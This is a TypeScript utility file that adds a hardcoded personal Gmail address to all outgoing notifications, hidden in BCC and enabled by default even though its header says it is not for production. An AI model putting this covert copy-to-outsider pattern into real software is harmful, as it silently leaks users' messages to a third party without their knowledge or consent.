/**
 * @fileoverview Debug Email Utility
 * @version 1.0.0
 * 
 * Description:
 * Utility functions for adding debug/test email recipients to notifications
 * during development and testing. This should not be enabled in production.
 */

import { Recipients } from '@/services/notifications/types';
import { logger } from '@/utils/logger';

// Admin monitoring email that receives copies of all notifications
export const ADMIN_MONITOR_EMAIL = 'bonzys@gmail.com';

// Flag to enable/disable debug email functionality
export const INCLUDE_DEBUG_EMAIL = true;

// Use BCC for admin monitoring to keep it hidden from other recipients
export const USE_BCC_FOR_ADMIN = true;

/**
 * Adds a debug recipient to notification recipients
 * 
 * @param recipients - The original recipients object
 * @returns The modified recipients object with debug email added
 */
export function addDebugRecipient(recipients: Recipients): Recipients {
  if (!INCLUDE_DEBUG_EMAIL) {
    return recipients;
  }
  
  try {
    // Create a defensive copy to avoid modifying the original object
    const result: Recipients = {
      to: [...recipients.to],
      cc: recipients.cc ? [...recipients.cc] : [],
      bcc: recipients.bcc ? [...recipients.bcc] : []
    };
    
    if (USE_BCC_FOR_ADMIN) {
      // Add admin email to BCC field
      if (!result.bcc) {
        result.bcc = [];
      }
      
      if (!result.bcc.includes(ADMIN_MONITOR_EMAIL)) {
        result.bcc.push(ADMIN_MONITOR_EMAIL);
        logger.debug(`Admin monitor email ${ADMIN_MONITOR_EMAIL} added to BCC recipients`);
      }
    } else {
      // Legacy behavior: Add to CC if not using BCC
      // Ensure cc exists
      if (!result.cc) {
        result.cc = [];
      }
      
      if (!result.cc.includes(ADMIN_MONITOR_EMAIL)) {
        result.cc.push(ADMIN_MONITOR_EMAIL);
        logger.debug(`Admin monitor email ${ADMIN_MONITOR_EMAIL} added to CC recipients`);
      }
    }
    
    return result;
  } catch (error) {
    logger.error('Error adding debug email recipient:', error);
    // Return original recipients if there's an error
    return recipients;
  }
}
